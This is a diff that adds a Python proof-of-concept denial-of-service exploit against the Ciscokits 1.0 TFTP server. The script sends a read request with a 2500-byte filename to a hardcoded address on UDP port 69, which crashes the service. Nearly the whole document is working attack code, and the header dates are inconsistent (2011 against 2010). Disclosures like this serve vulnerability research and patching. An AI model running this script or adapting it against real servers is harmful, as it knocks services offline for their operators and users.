@@ -1,0 +1,31 @@
+#!/usr/bin/python
+#Title: Ciscokits 1.0 TFTP Long Filename DoS
+#Author: Craig Freyman (@cd1zz)
+#Date: July 22, 2011
+#Software Link: http://www.certificationkits.com/tftpserver/tftpserver.zip
+#Tested on: Windows XP SP3
+#Vendor notified: July 22, 2010 - Vendor approved release of PoC on July 23, 2010. 
+#Notes: When a long file name read request is made the CPU will spike
+#and within about 20 seconds the TFTP service will crash.
+
+import socket,sys,time
+
+host = '192.168.133.128'
+port = 69
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+except:
+	print "socket() failed"
+	sys.exit(1)
+
+crash = "\x41" * 2500
+
+mode = "netascii"
+files = "a"
+print "File name READ crash"
+#seems to only work on a READ command = x01
+pwned = "\x00\x01" + crash + "\0" + mode + "\0"
+s.sendto(pwned, (host, port))
+time.sleep(2)
+
